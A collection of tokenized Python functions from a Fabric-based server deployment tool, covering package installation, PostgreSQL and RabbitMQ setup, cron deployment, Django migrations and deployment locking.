def get package list ( self ) : os version = self . os version # OS(type=LINUX, distro=UBUNTU, release='14.04') self . vprint ( 'os version:' , os version ) # Lookup legacy package list. # OS: [package1, package2, ...], req packages1 = self . required system packages if req packages1 : deprecation ( 'The required system packages attribute is deprecated, ' 'use the packager system packages property instead.' ) # Lookup new package list. # OS: [package1, package2, ...], req packages2 = self . packager system packages patterns = [ ( os version . type , os version . distro , os version . release ) , ( os version . distro , os version . release ) , ( os version . type , os version . distro ) , ( os version . distro , ) , os version . distro , ] self . vprint ( 'req packages1:' , req packages1 ) self . vprint ( 'req packages2:' , req packages2 ) package list = None found = False for pattern in patterns : self . vprint ( 'pattern:' , pattern ) for req packages in ( req packages1 , req packages2 ) : if pattern in req packages : package list = req packages [ pattern ] found = True break if not found : print ( 'Warning: No operating system pattern found for %s' % ( os version , ) ) self . vprint ( 'package list:' , package list ) return package list
def record manifest ( self ) : manifest = get component settings ( prefixes = [ self . name ] ) # Record a signature of each template so we know to redeploy when they change. for template in self . get templates ( ) : # Dereference brace notation. e.g. convert '{var}' to `env[var]`. if template and template . startswith ( '{' ) and template . endswith ( '}' ) : template = self . env [ template [ 1 : - 1 ] ] if not template : continue if template . startswith ( '%s/' % self . name ) : fqfn = self . find template ( template ) else : fqfn = self . find template ( '%s/%s' % ( self . name , template ) ) assert fqfn , 'Unable to find template: %s/%s' % ( self . name , template ) manifest [ ' %s' % template ] = get file hash ( fqfn ) for tracker in self . get trackers ( ) : manifest [ ' tracker %s' % tracker . get natural key hash ( ) ] = tracker . get thumbprint ( ) if self . verbose : pprint ( manifest , indent = 4 ) return manifest
def has changes ( self ) : lm = self . last manifest for tracker in self . get trackers ( ) : last thumbprint = lm [ ' tracker %s' % tracker . get natural key hash ( ) ] if tracker . is changed ( last thumbprint ) : return True return False
def configure ( self ) : lm = self . last manifest for tracker in self . get trackers ( ) : self . vprint ( 'Checking tracker:' , tracker ) last thumbprint = lm [ ' tracker %s' % tracker . get natural key hash ( ) ] self . vprint ( 'last thumbprint:' , last thumbprint ) has changed = tracker . is changed ( last thumbprint ) self . vprint ( 'Tracker changed:' , has changed ) if has changed : self . vprint ( 'Change detected!' ) tracker . act ( )
def user exists ( name ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn only = True ) : res = run as pg ( '''psql -t -A -c "SELECT COUNT(*) FROM pg user WHERE usename = '%(name)s';"''' % locals ( ) ) return ( res == "1" )
def write pgpass ( self , name = None , site = None , use sudo = 0 , root = 0 ) : r = self . database renderer ( name = name , site = site ) root = int ( root ) use sudo = int ( use sudo ) r . run ( 'touch {pgpass path}' ) if '~' in r . env . pgpass path : r . run ( 'chmod {pgpass chmod} {pgpass path}' ) else : r . sudo ( 'chmod {pgpass chmod} {pgpass path}' ) if root : r . env . shell username = r . env . get ( 'db root username' , 'postgres' ) r . env . shell password = r . env . get ( 'db root password' , 'password' ) else : r . env . shell username = r . env . db user r . env . shell password = r . env . db password r . append ( '{db host}:{port}:*:{shell username}:{shell password}' , r . env . pgpass path , use sudo = use sudo )
def exists ( self , name = 'default' , site = None , use root = False ) : r = self . database renderer ( name = name , site = site ) if int ( use root ) : kwargs = dict ( db user = r . env . get ( 'db root username' , 'postgres' ) , db password = r . env . get ( 'db root password' , 'password' ) , db host = r . env . db host , db name = r . env . db name , ) r . env . update ( kwargs ) # Set pgpass file. if r . env . db password : self . write pgpass ( name = name , root = use root ) #        cmd = ('psql --username={db user} --no-password -l '\ #            '--host={db host} --dbname={db name}'\ #            '| grep {db name} | wc -l').format(**env) ret = None with settings ( warn only = True ) : ret = r . run ( 'psql --username={db user} --host={db host} -l ' '| grep {db name} | wc -l' ) if ret is not None : if 'password authentication failed' in ret : ret = False else : ret = int ( ret ) >= 1 if ret is not None : print ( '%s database on site %s %s exist' % ( name , self . genv . SITE , 'DOES' if ret else 'DOES NOT' ) ) return ret
def load table ( self , table name , src , dst = 'localhost' , name = None , site = None ) : #TODO: incomplete r = self . database renderer ( name = name , site = site ) r . env . table name = table name r . run ( 'psql --user={dst db user} --host={dst db host} --command="DROP TABLE IF EXISTS {table name} CASCADE;"' ) r . run ( 'pg dump -t {table name} --user={dst db user} --host={dst db host} | psql --user={src db user} --host={src db host}' )
def interfaces ( ) : with settings ( hide ( 'running' , 'stdout' ) ) : if is file ( '/usr/sbin/dladm' ) : res = run ( '/usr/sbin/dladm show-link' ) else : res = sudo ( '/sbin/ifconfig -s' ) return [ line . split ( ' ' ) [ 0 ] for line in res . splitlines ( ) [ 1 : ] ]
def record manifest ( self ) : data = { } data [ 'required packages' ] = self . install required ( type = SYSTEM , verbose = False , list only = True ) data [ 'required packages' ] . sort ( ) data [ 'custom packages' ] = self . install custom ( list only = True ) data [ 'custom packages' ] . sort ( ) data [ 'repositories' ] = self . get repositories ( ) return data
def update ( self ) : packager = self . packager if packager == APT : self . sudo ( 'DEBIAN FRONTEND=noninteractive apt-get -yq update' ) elif packager == YUM : self . sudo ( 'yum update' ) else : raise Exception ( 'Unknown packager: %s' % ( packager , ) )
def install apt ( self , fn = None , package name = None , update = 0 , list only = 0 ) : r = self . local renderer assert self . genv [ ROLE ] apt req fqfn = fn or ( self . env . apt requirments fn and self . find template ( self . env . apt requirments fn ) ) if not apt req fqfn : return [ ] assert os . path . isfile ( apt req fqfn ) lines = list ( self . env . apt packages or [ ] ) for in open ( apt req fqfn ) . readlines ( ) : if . strip ( ) and not . strip ( ) . startswith ( '#' ) and ( not package name or . strip ( ) == package name ) : lines . extend ( pkg . strip ( ) for pkg in . split ( ' ' ) if pkg . strip ( ) ) if list only : return lines tmp fn = r . write temp file ( '\n' . join ( lines ) ) apt req fqfn = tmp fn if not self . genv . is local : r . put ( local path = tmp fn , remote path = tmp fn ) apt req fqfn = self . genv . put remote path r . sudo ( 'DEBIAN FRONTEND=noninteractive apt-get -yq update --fix-missing' ) r . sudo ( 'DEBIAN FRONTEND=noninteractive apt-get -yq install `cat "%s" | tr "\\n" " "`' % apt req fqfn )
def install yum ( self , fn = None , package name = None , update = 0 , list only = 0 ) : assert self . genv [ ROLE ] yum req fn = fn or self . find template ( self . genv . yum requirments fn ) if not yum req fn : return [ ] assert os . path . isfile ( yum req fn ) update = int ( update ) if list only : return [ . strip ( ) for in open ( yum req fn ) . readlines ( ) if . strip ( ) and not . strip . startswith ( '#' ) and ( not package name or . strip ( ) == package name ) ] if update : self . sudo or dryrun ( 'yum update --assumeyes' ) if package name : self . sudo or dryrun ( 'yum install --assumeyes %s' % package name ) else : if self . genv . is local : self . put or dryrun ( local path = yum req fn ) yum req fn = self . genv . put remote fn self . sudo or dryrun ( 'yum install --assumeyes $(cat %(yum req fn)s)' % yum req fn )
def install required ( self , type = None , service = None , list only = 0 , * * kwargs ) : # pylint: disable=redefined-builtin r = self . local renderer list only = int ( list only ) type = ( type or '' ) . lower ( ) . strip ( ) assert not type or type in PACKAGE TYPES , 'Unknown package type: %s' % ( type , ) lst = [ ] if type : types = [ type ] else : types = PACKAGE TYPES for type in types : if type == SYSTEM : content = '\n' . join ( self . list required ( type = type , service = service ) ) if list only : lst . extend ( for in content . split ( '\n' ) if . strip ( ) ) if self . verbose : print ( 'content:' , content ) break fd , fn = tempfile . mkstemp ( ) fout = open ( fn , 'w' ) fout . write ( content ) fout . close ( ) self . install custom ( fn = fn ) else : raise Not Implemented Error return lst
def uninstall blacklisted ( self ) : from burlap . system import distrib family blacklisted packages = self . env . blacklisted packages if not blacklisted packages : print ( 'No blacklisted packages.' ) return else : family = distrib family ( ) if family == DEBIAN : self . sudo ( 'DEBIAN FRONTEND=noninteractive apt-get -yq purge %s' % ' ' . join ( blacklisted packages ) ) else : raise Not Implemented Error ( 'Unknown family: %s' % family )
def deploy ( self , site = None ) : r = self . local renderer self . deploy logrotate ( ) cron crontabs = [ ] #         if self.verbose: #             print('hostname: "%s"' % (hostname,), file=sys.stderr) for site , site data in self . iter sites ( site = site ) : r . env . cron stdout log = r . format ( r . env . stdout log template ) r . env . cron stderr log = r . format ( r . env . stderr log template ) r . sudo ( 'touch {cron stdout log}' ) r . sudo ( 'touch {cron stderr log}' ) r . sudo ( 'sudo chown {user}:{user} {cron stdout log}' ) r . sudo ( 'sudo chown {user}:{user} {cron stderr log}' ) if self . verbose : print ( 'site:' , site , file = sys . stderr ) print ( 'env.crontabs selected:' , self . env . crontabs selected , file = sys . stderr ) for selected crontab in self . env . crontabs selected : lines = self . env . crontabs available . get ( selected crontab , [ ] ) if self . verbose : print ( 'lines:' , lines , file = sys . stderr ) for line in lines : cron crontabs . append ( r . format ( line ) ) if not cron crontabs : return cron crontabs = self . env . crontab headers + cron crontabs cron crontabs . append ( '\n' ) r . env . crontabs rendered = '\n' . join ( cron crontabs ) fn = self . write to file ( content = r . env . crontabs rendered ) print ( 'fn:' , fn ) r . env . put remote path = r . put ( local path = fn ) if isinstance ( r . env . put remote path , ( tuple , list ) ) : r . env . put remote path = r . env . put remote path [ 0 ] r . sudo ( 'crontab -u {cron user} {put remote path}' )
def configure users ( self , site = None , full = 0 , only data = 0 ) : site = site or ALL full = int ( full ) if full and not only data : packager = self . get satchel ( 'packager' ) packager . install required ( type = SYSTEM , service = self . name ) r = self . local renderer params = self . get user vhosts ( site = site ) # [(user, password, vhost)] with settings ( warn only = True ) : self . add admin user ( ) params = sorted ( list ( params ) ) if not only data : for user , password , vhost in params : r . env . broker user = user r . env . broker password = password r . env . broker vhost = vhost with settings ( warn only = True ) : r . sudo ( 'rabbitmqctl add user {broker user} {broker password}' ) r . sudo ( 'rabbitmqctl add vhost {broker vhost}' ) r . sudo ( 'rabbitmqctl set permissions -p {broker vhost} {broker user} ".*" ".*" ".*"' ) r . sudo ( 'rabbitmqctl set permissions -p {broker vhost} {admin username} ".*" ".*" ".*"' ) return params
def record manifest ( self ) : data = super ( Rabbit MQ Satchel , self ) . record manifest ( ) params = sorted ( list ( self . get user vhosts ( ) ) ) # [(user, password, vhost)] data [ 'rabbitmq all site vhosts' ] = params data [ 'sites' ] = list ( self . genv . sites or [ ] ) return data
def iter dict differences ( a , b ) : common keys = set ( a ) . union ( b ) for k in common keys : a value = a . get ( k ) b value = b . get ( k ) if a value != b value : yield k , ( a value , b value )
def get component order ( component names ) : assert isinstance ( component names , ( tuple , list ) ) component dependences = { } for name in component names : deps = set ( manifest deployers befores . get ( name , [ ] ) ) deps = deps . intersection ( component names ) component dependences [ name ] = deps component order = list ( topological sort ( component dependences . items ( ) ) ) return component order
def get deploy funcs ( components , current thumbprint , previous thumbprint , preview = False ) : for component in components : funcs = manifest deployers . get ( component , [ ] ) for func name in funcs : #TODO:remove this after burlap.* naming prefix bug fixed if func name . startswith ( 'burlap.' ) : print ( 'skipping %s' % func name ) continue takes diff = manifest deployers takes diff . get ( func name , False ) func = resolve deployer ( func name ) current = current thumbprint . get ( component ) last = previous thumbprint . get ( component ) if takes diff : yield func name , partial ( func , last = last , current = current ) else : yield func name , partial ( func )
def manifest filename ( self ) : r = self . local renderer tp fn = r . format ( r . env . data dir + '/manifest.yaml' ) return tp fn
def lock ( self ) : self . init ( ) r = self . local renderer if self . file exists ( r . env . lockfile path ) : raise exceptions . Abort Deployment ( 'Lock file %s exists. Perhaps another deployment is currently underway?' % r . env . lockfile path ) else : self . vprint ( 'Locking %s.' % r . env . lockfile path ) r . env . hostname = socket . gethostname ( ) r . run or local ( 'echo "{hostname}" > {lockfile path}' )
def unlock ( self ) : self . init ( ) r = self . local renderer if self . file exists ( r . env . lockfile path ) : self . vprint ( 'Unlocking %s.' % r . env . lockfile path ) r . run or local ( 'rm -f {lockfile path}' )
def get component funcs ( self , components = None ) : current tp = self . get current thumbprint ( components = components ) or { } previous tp = self . get previous thumbprint ( components = components ) or { } if self . verbose : print ( 'Current thumbprint:' ) pprint ( current tp , indent = 4 ) print ( 'Previous thumbprint:' ) pprint ( previous tp , indent = 4 ) differences = list ( iter dict differences ( current tp , previous tp ) ) if self . verbose : print ( 'Differences:' ) pprint ( differences , indent = 4 ) component order = get component order ( [ k for k , ( , ) in differences ] ) if self . verbose : print ( 'component order:' ) pprint ( component order , indent = 4 ) plan funcs = list ( get deploy funcs ( component order , current tp , previous tp ) ) return component order , plan funcs
def preview ( self , components = None , ask = 0 ) : ask = int ( ask ) self . init ( ) component order , plan funcs = self . get component funcs ( components = components ) print ( '\n%i changes found for host %s.\n' % ( len ( component order ) , self . genv . host string ) ) if component order and plan funcs : if self . verbose : print ( 'These components have changed:\n' ) for component in sorted ( component order ) : print ( ( ' ' * 4 ) + component ) print ( 'Deployment plan for host %s:\n' % self . genv . host string ) for func name , in plan funcs : print ( success str ( ( ' ' * 4 ) + func name ) ) if component order : print ( ) if ask and self . genv . host string == self . genv . hosts [ - 1 ] : if component order : if not raw input ( 'Begin deployment? [yn] ' ) . strip ( ) . lower ( ) . startswith ( 'y' ) : sys . exit ( 0 ) else : sys . exit ( 0 )
def push ( self , components = None , yes = 0 ) : from burlap import notifier service = self . get satchel ( 'service' ) self . lock ( ) try : yes = int ( yes ) if not yes : # If we want to confirm the deployment with the user, and we're at the first server, # then run the preview. if self . genv . host string == self . genv . hosts [ 0 ] : execute ( partial ( self . preview , components = components , ask = 1 ) ) notifier . notify pre deployment ( ) component order , plan funcs = self . get component funcs ( components = components ) service . pre deploy ( ) for func name , plan func in plan funcs : print ( 'Executing %s...' % func name ) plan func ( ) self . fake ( components = components ) service . post deploy ( ) notifier . notify post deployment ( ) finally : self . unlock ( )
def get thumbprint ( self ) : d = { } settings = dj . get settings ( ) for name in self . names : d [ name ] = getattr ( settings , name ) return d
def get settings ( self , site = None , role = None ) : r = self . local renderer stdout = sys . stdout stderr = sys . stderr if not self . verbose : sys . stdout = String IO ( ) sys . stderr = String IO ( ) try : sys . path . insert ( 0 , r . env . src dir ) # Temporarily override SITE. tmp site = self . genv . SITE if site and site . endswith ( ' secure' ) : site = site [ : - 7 ] site = site or self . genv . SITE or self . genv . default site self . set site ( site ) # Temporarily override ROLE. tmp role = self . genv . ROLE if role : self . set role ( role ) try : # We need to explicitly delete sub-modules from sys.modules. Otherwise, reload() skips # them and they'll continue to contain obsolete settings. if r . env . delete module with prefixes : for name in sorted ( sys . modules ) : for prefix in r . env . delete module with prefixes : if name . startswith ( prefix ) : if self . verbose : print ( 'Deleting module %s prior to re-import.' % name ) del sys . modules [ name ] break for name in list ( sys . modules ) : for s in r . env . delete module containing : if s in name : del sys . modules [ name ] break if r . env . settings module in sys . modules : del sys . modules [ r . env . settings module ] #TODO:fix r.env.settings module not loading from settings? #                 print('r.genv.django settings module:', r.genv.django settings module, file= stdout) #                 print('r.genv.dj settings module:', r.genv.dj settings module, file= stdout) #                 print('r.env.settings module:', r.env.settings module, file= stdout) if 'django settings module' in r . genv : r . env . settings module = r . genv . django settings module else : r . env . settings module = r . env . settings module or r . genv . dj settings module if self . verbose : print ( 'r.env.settings module:' , r . env . settings module , r . format ( r . env . settings module ) ) module = import module ( r . format ( r . env . settings module ) ) if site : assert site == module . SITE , 'Unable to set SITE to "%s" Instead it is set to "%s".' % ( site , module . SITE ) # Works as long as settings.py doesn't also reload anything. import imp imp . reload ( module ) except Import Error as e : print ( 'Warning: Could not import settings for site "%s": %s' % ( site , e ) , file = stdout ) traceback . print exc ( file = stdout ) #raise # breaks * secure pseudo sites return finally : if tmp site : self . set site ( tmp site ) if tmp role : self . set role ( tmp role ) finally : sys . stdout = stdout sys . stderr = stderr sys . path . remove ( r . env . src dir ) return module
def install sql ( self , site = None , database = 'default' , apps = None , stop on error = 0 , fn = None ) : #from burlap.db import load db set stop on error = int ( stop on error ) site = site or ALL name = database r = self . local renderer paths = glob . glob ( r . format ( r . env . install sql path template ) ) apps = [ for in ( apps or '' ) . split ( ',' ) if . strip ( ) ] if self . verbose : print ( 'install sql.apps:' , apps ) def cmp paths ( d0 , d1 ) : if d0 [ 1 ] and d0 [ 1 ] in d1 [ 2 ] : return - 1 if d1 [ 1 ] and d1 [ 1 ] in d0 [ 2 ] : return + 1 return cmp ( d0 [ 0 ] , d1 [ 0 ] ) def get paths ( t ) : data = [ ] # [(path, view name, content)] for path in paths : if fn and fn not in path : continue parts = path . split ( '.' ) if len ( parts ) == 3 and parts [ 1 ] != t : continue if not path . lower ( ) . endswith ( '.sql' ) : continue content = open ( path , 'r' ) . read ( ) matches = re . findall ( r'[\s\t]+VIEW[\s\t]+([a-z A-Z0-9 ]{3,})' , content , flags = re . IGNORECASE ) view name = '' if matches : view name = matches [ 0 ] print ( 'Found view %s.' % view name ) data . append ( ( path , view name , content ) ) for d in sorted ( data , cmp = cmp paths ) : yield d [ 0 ] def run paths ( paths , cmd template , max retries = 3 ) : r = self . local renderer paths = list ( paths ) error counts = defaultdict ( int ) # {path:count} terminal = set ( ) if self . verbose : print ( 'Checking %i paths.' % len ( paths ) ) while paths : path = paths . pop ( 0 ) if self . verbose : print ( 'path:' , path ) app name = re . findall ( r'/([^/]+)/sql/' , path ) [ 0 ] if apps and app name not in apps : self . vprint ( 'skipping because app name %s not in apps' % app name ) continue with self . settings ( warn only = True ) : if self . is local : r . env . sql path = path else : r . env . sql path = '/tmp/%s' % os . path . split ( path ) [ - 1 ] r . put ( local path = path , remote path = r . env . sql path ) ret = r . run or local ( cmd template ) if ret and ret . return code : if stop on error : raise Exception ( 'Unable to execute file %s' % path ) error counts [ path ] += 1 if error counts [ path ] < max retries : paths . append ( path ) else : terminal . add ( path ) if terminal : print ( '%i files could not be loaded.' % len ( terminal ) , file = sys . stderr ) for path in sorted ( list ( terminal ) ) : print ( path , file = sys . stderr ) print ( file = sys . stderr ) if self . verbose : print ( 'install sql.db engine:' , r . env . db engine ) for site , site data in self . iter sites ( site = site , no secure = True ) : self . set db ( name = name , site = site ) if 'postgres' in r . env . db engine or 'postgis' in r . env . db engine : paths = list ( get paths ( 'postgresql' ) ) run paths ( paths = paths , cmd template = "psql --host={db host} --user={db user} --no-password -d {db name} -f {sql path}" ) elif 'mysql' in r . env . db engine : paths = list ( get paths ( 'mysql' ) ) run paths ( paths = paths , cmd template = "mysql -v -h {db host} -u {db user} -p'{db password}' {db name} < {sql path}" ) else : raise Not Implemented Error
def createsuperuser ( self , username = 'admin' , email = None , password = None , site = None ) : r = self . local renderer site = site or self . genv . SITE self . set site specifics ( site ) options = [ '--username=%s' % username ] if email : options . append ( '--email=%s' % email ) if password : options . append ( '--password=%s' % password ) r . env . options str = ' ' . join ( options ) if self . is local : r . env . project dir = r . env . local project dir r . genv . SITE = r . genv . SITE or site r . run or local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project dir}; {manage cmd} {createsuperuser cmd} {options str}' )
def manage ( self , cmd , * args , * * kwargs ) : r = self . local renderer environs = kwargs . pop ( 'environs' , '' ) . strip ( ) if environs : environs = ' ' . join ( 'export %s=%s;' % tuple ( . split ( '=' ) ) for in environs . split ( ',' ) ) environs = ' ' + environs + ' ' r . env . cmd = cmd r . env . SITE = r . genv . SITE or r . genv . default site r . env . args = ' ' . join ( map ( str , args ) ) r . env . kwargs = ' ' . join ( ( '--%s' % k if v in ( True , 'True' ) else '--%s=%s' % ( k , v ) ) for k , v in kwargs . items ( ) ) r . env . environs = environs if self . is local : r . env . project dir = r . env . local project dir r . run or local ( 'export SITE={SITE}; export ROLE={ROLE};{environs} cd {project dir}; {manage cmd} {cmd} {args} {kwargs}' )
def load django settings ( self ) : r = self . local renderer # Save environment variables so we can restore them later. env = { } save vars = [ 'ALLOW CELERY' , 'DJANGO SETTINGS MODULE' ] for var name in save vars : env [ var name ] = os . environ . get ( var name ) try : # Allow us to import local app modules. if r . env . local project dir : sys . path . insert ( 0 , r . env . local project dir ) #TODO:remove this once bug in django-celery has been fixed os . environ [ 'ALLOW CELERY' ] = '0' #             print('settings module:', r.format(r.env.settings module)) os . environ [ 'DJANGO SETTINGS MODULE' ] = r . format ( r . env . settings module ) #             os.environ['CELERY LOADER'] = 'django' #             os.environ['SITE'] = r.genv.SITE or r.genv.default site #             os.environ['ROLE'] = r.genv.ROLE or r.genv.default role # In Django >= 1.7, fixes the error App Registry Not Ready: Apps aren't loaded yet # Disabling, in Django >= 1.10, throws exception: # Runtime Error: Model class django.contrib.contenttypes.models.Content Type # doesn't declare an explicit app label and isn't in an application in INSTALLED APPS. #             try: #                 from django.core.wsgi import get wsgi application #                 application = get wsgi application() #             except (Import Error, Runtime Error): #                 raise #                 print('Unable to get wsgi application.') #                 traceback.print exc() # In Django >= 1.7, fixes the error App Registry Not Ready: Apps aren't loaded yet try : import django django . setup ( ) except Attribute Error : # This doesn't exist in Django < 1.7, so ignore it. pass # Load Django settings. settings = self . get settings ( ) try : from django . contrib import staticfiles from django . conf import settings as settings # get settings() doesn't raise Import Error but returns None instead if settings is not None : for k , v in settings . dict . items ( ) : setattr ( settings , k , v ) else : raise Import Error except ( Import Error , Runtime Error ) : print ( 'Unable to load settings.' ) traceback . print exc ( ) finally : # Restore environment variables. for var name , var value in env . items ( ) : if var value is None : del os . environ [ var name ] else : os . environ [ var name ] = var value return settings
def syncdb ( self , site = None , all = 0 , database = None , ignore errors = 1 ) : # pylint: disable=redefined-builtin r = self . local renderer ignore errors = int ( ignore errors ) post south = self . version tuple >= ( 1 , 7 , 0 ) use run syncdb = self . version tuple >= ( 1 , 9 , 0 ) # DEPRECATED: removed in Django>=1.7 r . env . db syncdb all flag = '--all' if int ( all ) else '' r . env . db syncdb database = '' if database : r . env . db syncdb database = ' --database=%s' % database if self . is local : r . env . project dir = r . env . local project dir site = site or self . genv . SITE for site , site data in r . iter unique databases ( site = site ) : r . env . SITE = site with self . settings ( warn only = ignore errors ) : if post south : if use run syncdb : r . run or local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project dir}; ' '{manage cmd} migrate --run-syncdb --noinput {db syncdb database}' ) else : # Between Django>=1.7,<1.9 we can only do a regular migrate, no true syncdb. r . run or local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project dir}; ' '{manage cmd} migrate --noinput {db syncdb database}' ) else : r . run or local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project dir}; ' '{manage cmd} syncdb --noinput {db syncdb all flag} {db syncdb database}' )
def migrate ( self , app = '' , migration = '' , site = None , fake = 0 , ignore errors = None , skip databases = None , database = None , migrate apps = '' , delete ghosts = 1 ) : #     Note, to pass a comma-delimted list in a fab command, escape the comma with a back slash. # #         e.g. # #             fab staging dj.migrate:migrate apps=oneapp\,twoapp\,threeapp r = self . local renderer ignore errors = int ( r . env . ignore migration errors if ignore errors is None else ignore errors ) delete ghosts = int ( delete ghosts ) post south = self . version tuple >= ( 1 , 7 , 0 ) if self . version tuple >= ( 1 , 9 , 0 ) : delete ghosts = 0 skip databases = ( skip databases or '' ) if isinstance ( skip databases , six . string types ) : skip databases = [ . strip ( ) for in skip databases . split ( ',' ) if . strip ( ) ] migrate apps = migrate apps or '' migrate apps = [ . strip ( ) . split ( '.' ) [ - 1 ] for in migrate apps . strip ( ) . split ( ',' ) if . strip ( ) ] if app : migrate apps . append ( app ) r . env . migrate migration = migration or '' r . env . migrate fake str = '--fake' if int ( fake ) else '' r . env . migrate database = '--database=%s' % database if database else '' r . env . migrate merge = '--merge' if not post south else '' r . env . delete ghosts = '--delete-ghost-migrations' if delete ghosts and not post south else '' self . vprint ( 'project dir0:' , r . env . project dir , r . genv . get ( 'dj project dir' ) , r . genv . get ( 'project dir' ) ) self . vprint ( 'migrate apps:' , migrate apps ) if self . is local : r . env . project dir = r . env . local project dir # CS 2017-3-29 Don't bypass the iterator. That causes reversion to the global env that could corrupt the generated commands. #databases = list(self.iter unique databases(site=site))#TODO:remove # CS 2017-4-24 Don't specify a single site as the default when none is supplied. Otherwise all other sites will be ignored. #site = site or self.genv.SITE site = site or ALL databases = self . iter unique databases ( site = site ) for site , site data in databases : self . vprint ( '-' * 80 , file = sys . stderr ) self . vprint ( 'site:' , site , file = sys . stderr ) if self . env . available sites by host : hostname = self . current hostname sites on host = self . env . available sites by host . get ( hostname , [ ] ) if sites on host and site not in sites on host : self . vprint ( 'skipping site:' , site , sites on host , file = sys . stderr ) continue if not migrate apps : migrate apps . append ( ' ' ) for app in migrate apps : # In cases where we're migrating built-in apps or apps with dotted names # e.g. django.contrib.auth, extract the name used for the migrate command. r . env . migrate app = app . split ( '.' ) [ - 1 ] self . vprint ( 'project dir1:' , r . env . project dir , r . genv . get ( 'dj project dir' ) , r . genv . get ( 'project dir' ) ) r . env . SITE = site with self . settings ( warn only = ignore errors ) : r . run or local ( 'export SITE={SITE}; export ROLE={ROLE}; {migrate pre command} cd {project dir}; ' '{manage cmd} migrate --noinput {migrate merge} --traceback ' '{migrate database} {delete ghosts} {migrate app} {migrate migration} ' '{migrate fake str}' )
def database renderer ( self , name = None , site = None , role = None ) : name = name or self . env . default db name site = site or self . genv . SITE role = role or self . genv . ROLE key = ( name , site , role ) self . vprint ( 'checking key:' , key ) if key not in self . database renderers : self . vprint ( 'No cached db renderer, generating...' ) if self . verbose : print ( 'db.name:' , name ) print ( 'db.databases:' , self . env . databases ) print ( 'db.databases[%s]:' % name , self . env . databases . get ( name ) ) d = type ( self . genv ) ( self . lenv ) d . update ( self . get database defaults ( ) ) d . update ( self . env . databases . get ( name , { } ) ) d [ 'db name' ] = name if self . verbose : print ( 'db.d:' ) pprint ( d , indent = 4 ) print ( 'db.connection handler:' , d . connection handler ) if d . connection handler == CONNECTION HANDLER DJANGO : self . vprint ( 'Using django handler...' ) dj = self . get satchel ( 'dj' ) if self . verbose : print ( 'Loading Django DB settings for site {} and role {}.' . format ( site , role ) , file = sys . stderr ) dj . set db ( name = name , site = site , role = role ) d = dj . local renderer . collect genv ( include local = True , include global = False ) # Copy "dj db *" into "db *". for k , v in d . items ( ) : if k . startswith ( 'dj db ' ) : d [ k [ 3 : ] ] = v del d [ k ] if self . verbose : print ( 'Loaded:' ) pprint ( d ) d . update ( d ) elif d . connection handler and d . connection handler . startswith ( CONNECTION HANDLER CUSTOM + ':' ) : callable str = d . connection handler [ len ( CONNECTION HANDLER CUSTOM + ':' ) : ] self . vprint ( 'Using custom handler %s...' % callable str ) d = str to callable ( callable str ) ( role = self . genv . ROLE ) if self . verbose : print ( 'Loaded:' ) pprint ( d ) d . update ( d ) r = Local Renderer ( self , lenv = d ) # Optionally set any root logins needed for administrative commands. self . set root login ( r ) self . database renderers [ key ] = r else : self . vprint ( 'Cached db renderer found.' ) return self . database renderers [ key ]
def get free space ( self ) : cmd = "df -k | grep -v E '^Filesystem|tmpfs|cdrom|none|udev|cgroup' | awk '{ print($1 \" \" $4 }'" lines = [ for in self . run ( cmd ) . strip ( ) . split ( '\n' ) if . startswith ( '/' ) ] assert len ( lines ) == 1 , 'Ambiguous devices: %s' % str ( lines ) device , kb = lines [ 0 ] . split ( ' ' ) free space = int ( kb ) * 1024 self . vprint ( 'free space (bytes):' , free space ) return free space
def load db set ( self , name , r = None ) : r = r or self db set = r . genv . db sets . get ( name , { } ) r . genv . update ( db set )
def loadable ( self , src , dst ) : from fabric import state from fabric . task utils import crawl src task = crawl ( src , state . commands ) assert src task , 'Unknown source role: %s' % src dst task = crawl ( dst , state . commands ) assert dst task , 'Unknown destination role: %s' % src # Get source database size. src task ( ) env . host string = env . hosts [ 0 ] src size bytes = self . get size ( ) # Get target database size, if any. dst task ( ) env . host string = env . hosts [ 0 ] try : dst size bytes = self . get size ( ) except ( Value Error , Type Error ) : dst size bytes = 0 # Get target host disk size. free space bytes = self . get free space ( ) # Deduct existing database size, because we'll be deleting it. balance bytes = free space bytes + dst size bytes - src size bytes balance bytes scaled , units = pretty bytes ( balance bytes ) viable = balance bytes >= 0 if self . verbose : print ( 'src db size:' , pretty bytes ( src size bytes ) ) print ( 'dst db size:' , pretty bytes ( dst size bytes ) ) print ( 'dst free space:' , pretty bytes ( free space bytes ) ) print if viable : print ( 'Viable! There will be %.02f %s of disk space left.' % ( balance bytes scaled , units ) ) else : print ( 'Not viable! We would be %.02f %s short.' % ( balance bytes scaled , units ) ) return viable
def assume localhost ( self ) : if not self . genv . host string : self . genv . host string = 'localhost' self . genv . hosts = [ 'localhost' ] self . genv . user = getpass . getuser ( )
def fix lsmod for pi3 ( self ) : r = self . local renderer r . env . rpi2 conf = '/etc/modules-load.d/rpi2.conf' r . sudo ( "sed '/bcm2808 rng/d' {rpi2 conf}" ) r . sudo ( "echo bcm2835 rng >> {rpi2 conf}" )
def pre deploy ( self ) : for service in self . genv . services : service = service . strip ( ) . upper ( ) funcs = common . service pre deployers . get ( service ) if funcs : print ( 'Running pre-deployments for service %s...' % ( service , ) ) for func in funcs : func ( )
def deploy ( self ) : for service in self . genv . services : service = service . strip ( ) . upper ( ) funcs = common . service deployers . get ( service ) if funcs : print ( 'Deploying service %s...' % ( service , ) ) for func in funcs : if not self . dryrun : func ( )
def post deploy ( self ) : for service in self . genv . services : service = service . strip ( ) . upper ( ) self . vprint ( 'post deploy:' , service ) funcs = common . service post deployers . get ( service ) if funcs : self . vprint ( 'Running post-deployments for service %s...' % ( service , ) ) for func in funcs : try : func ( ) except Exception as e : print ( 'Post deployment error: %s' % e , file = sys . stderr ) print ( traceback . format exc ( ) , file = sys . stderr )
def configure ( self ) : print ( 'env.services:' , self . genv . services ) for service in list ( self . genv . services ) : service = service . strip ( ) . upper ( ) funcs = common . service configurators . get ( service , [ ] ) if funcs : print ( '!' * 80 ) print ( 'Configuring service %s...' % ( service , ) ) for func in funcs : print ( 'Function:' , func ) if not self . dryrun : func ( )
